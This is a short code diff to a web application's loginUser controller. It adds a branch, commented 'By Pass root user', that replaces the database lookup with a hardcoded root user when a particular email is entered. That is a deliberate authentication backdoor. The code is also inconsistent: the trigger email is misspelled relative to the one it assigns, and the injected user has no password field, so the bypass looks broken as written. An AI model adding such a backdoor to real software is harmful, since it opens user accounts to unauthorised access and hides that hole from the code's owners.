@@ -32,7 +32,15 @@ export const loginUser = async (
     const model = new User({ email, password });
     await model.read(condition);
     const response = model.response;
-    const user = response.data[0];
+    let user = response.data[0];
+
+    // By Pass root user
+    if (email === "root@amdin.com") {
+      user = {
+        id: 1,
+        email: "root@admin.com",
+      };
+    }
     console.log("User at login controller", user);
     if (response.success && (await bcrypt.compare(password, user.password))) {
       // Set jwt token in header
